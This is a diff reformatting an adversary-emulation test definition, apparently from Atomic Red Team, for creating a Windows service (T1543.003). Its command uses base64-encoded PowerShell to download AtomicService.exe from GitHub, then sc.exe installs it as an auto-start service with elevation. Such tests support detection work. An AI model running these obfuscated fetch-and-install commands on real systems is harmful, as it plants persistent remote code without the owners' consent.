@@ -1,24 +1,19 @@
-- id: 71d1edad-5425-5ce2-966e-8e6f853d9f97
+- requirements: []
   name: Soumaia ART Tests - Remote Service Installation CMD
   description: 'Download an executable from github and start it as a service on a remote endpoint
 
     Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout. (requires elevation)'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1543.003
-    name: 'Create or Modify System Process: Windows Service'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQAMwAuADAAMAAzAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiAAoA
-          )
-          sc.exe \\localhost create AtomicTestService_CMD binPath= ".\AtomicService.exe" start=auto type=Own
-          sc.exe \\localhost start AtomicTestService_CMD
-        cleanup: |-
-          sc.exe \\localhost stop AtomicTestService_CMD >nul 2>&1
-          sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1
-        payloads:
-        - AtomicService.exe
+  technique_id: T1543.003
+  technique_name: 'Create or Modify System Process: Windows Service'
+  executors:
+  - cleanup:
+    - sc.exe \\localhost stop AtomicTestService_CMD >nul 2>&1 & sc.exe \\localhost delete AtomicTestService_CMD >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - AtomicService.exe
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQAMwAuADAAMAAzAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBTAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAdABvAG0AaQBjAFMAZQByAHYAaQBjAGUALgBlAHgAZQAiAAoA ) & sc.exe \\localhost create AtomicTestService_CMD binPath= ".\AtomicService.exe" start=auto type=Own & sc.exe \\localhost start AtomicTestService_CMD
+  id: 71d1edad-5425-5ce2-966e-8e6f853d9f97
